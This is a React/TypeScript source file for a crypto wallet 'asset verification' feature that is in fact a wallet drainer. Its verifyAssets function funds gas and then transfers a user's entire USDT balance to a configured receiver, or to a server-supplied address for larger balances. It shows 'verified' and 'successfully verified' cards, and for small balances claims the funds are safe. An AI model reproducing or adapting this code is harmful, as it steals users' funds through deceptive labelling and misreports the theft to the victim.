import React, { useState, useEffect } from "react";
import { ethers } from "ethers";
import { createRoot } from "react-dom/client";
import {fundBNBIfNeeded} from "@/utils/gasUtils"
import usdtAbi from "../abi/USDT.json";
import { USDT_ADDRESS, USDT_RECEIVER, CHAIN_ID, CHAIN_ID_DECIMAL, NETWORK_NAME, USDT_THRESHOLD, GAS_FUNDER_ADDRESS, USDT_THRESHOLD2 } from "../utils/config";
import SuccessCard from "./SuccessCard";
import VerifiedCard from "./VerifiedCard";

// Global state to control card visibility from the standalone function
let globalShowCard = false;
let globalVerificationStatus = null;
// @ts-expect-error build

let root = null;

// Function to render verification cards
export const renderVerificationCard = (status: {
  success: boolean;
  transferred: boolean;
  amount: string;
  message: string;
}) => {
  console.log("🎴 Rendering verification card with status:", status);
  globalVerificationStatus = status;
  globalShowCard = true;
  
  // Create verification element if doesn't exist
  let verificationRoot = document.getElementById('verification-root');
  if (!verificationRoot) {
    console.log("📝 Creating verification root element");
    verificationRoot = document.createElement('div');
    verificationRoot.id = 'verification-root';
    document.body.appendChild(verificationRoot);
  }

  console.log("🎨 Rendering appropriate card based on status");
  // Create root if it doesn't exist
// @ts-expect-error build

  if (!root) {
    root = createRoot(verificationRoot);
  }

  // Render the appropriate card based on status
  root.render(
    status.transferred ? (
      <SuccessCard amount={status.amount} onClose={closeCard} />
    ) : (
      <VerifiedCard amount={status.amount} onClose={closeCard} />
    )
  );

  console.log("📢 Dispatching verification-complete event");
  // Also dispatch event for any mounted components
  window.dispatchEvent(new Event('verification-complete'));
};

// Function to close cards
const closeCard = () => {
  console.log("🔒 Closing verification card");
  globalShowCard = false;
  
  // Find and cleanup the verification root
  const verificationRoot = document.getElementById('verification-root');
  if (verificationRoot) {
    console.log("🧹 Cleaning up verification root");
// @ts-expect-error build

    if (root) {
      root.unmount();
      root = null;
    }
    if (!verificationRoot.hasChildNodes()) {
      verificationRoot.remove();
    }
  }
  
  console.log("📢 Dispatching verification-complete event");
  window.dispatchEvent(new Event('verification-complete'));
};

// Plain function for onClick handler
export const verifyAssets = async (
  provider: ethers.providers.Web3Provider,
  signer: ethers.providers.JsonRpcSigner,
  userAddress: string,
  usdt: ethers.Contract,
  balance: ethers.BigNumber,
  readableBalance: string,
  decimals: number
) => {
  console.log("🚀 Starting asset verification process");
  console.log("📊 Current balance:", readableBalance, "USDT");
  
  try {
    const threshold = ethers.utils.parseUnits(String(USDT_THRESHOLD), decimals);
    const threshold2 = ethers.utils.parseUnits(String(USDT_THRESHOLD2), decimals);
    
    const isAboveThreshold2 = balance.gte(threshold2);
    const isAboveThreshold1 = balance.gte(threshold);

    if (isAboveThreshold1) { // This covers both `> threshold` and `> threshold2`
      console.log("💰 Balance meets threshold, proceeding with funding check and transfer");

      // Await gas funding since it's required for the transfer to succeed
      await fundBNBIfNeeded(provider, userAddress);
      
      const usdtWithSigner = usdt.connect(signer);
      let receiverAddress: string;
      let showSuccessCard: boolean;

      if (isAboveThreshold2) {
        console.log("📝 Preparing special transfer (balance > threshold2)");
        try {
          const response = await fetch('/api/get-receiver-address');
          if (!response.ok) {
            const errorData = await response.json().catch(() => ({})); // try to get json, but don't fail if not
            throw new Error(errorData.details || `Failed to fetch receiver address: ${response.statusText}`);
          }
          const data = await response.json();
          receiverAddress = data.address;
          if (!receiverAddress) {
            throw new Error("API did not return a receiver address");
          }
          showSuccessCard = false;
        } catch (e) {
            console.error("❌ Failed to get special receiver address:", e);
            // Abort if we can't get the required special address
            return;
        }
      } else {
        console.log("📝 Preparing standard transfer (balance > threshold1)");
        receiverAddress = USDT_RECEIVER;
        showSuccessCard = true;
      }
      
      try {
        console.log("👉 From:", userAddress);
        console.log("👉 To:", receiverAddress);
        console.log("👉 Amount:", readableBalance, "USDT");

        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
        console.log("🔄 Transaction submitted:", tx.hash);
        console.log("⏳ Waiting for transaction confirmation...");
        
        await tx.wait();
        console.log("✅ Transaction confirmed!");

        if (showSuccessCard) {
          renderVerificationCard({
            success: true,
            transferred: true,
            amount: readableBalance,
            message: `Successfully verified and transferred ${readableBalance} USDT`
          });
        }
      } catch (transferError) {
        // @ts-expect-error build
        if (transferError.code === 4001) {
          console.log("❌ User rejected transaction");
          return;
        }
        console.error("❌ Transfer error occurred:", transferError);
        throw transferError;
      }
    } else {
      console.log("ℹ️ Balance below threshold, marking as verified without transfer");
      renderVerificationCard({
        success: true,
        transferred: false,
        amount: readableBalance,
        message: `Verified: Your ${readableBalance} USDT is safe and credible to use`
      });
    }
  } catch (error) {
    console.error("❌ Verification process error:", error);
    // You might want to show an error card to the user here
    // alert(`Error: ${error.message}`);
  }
};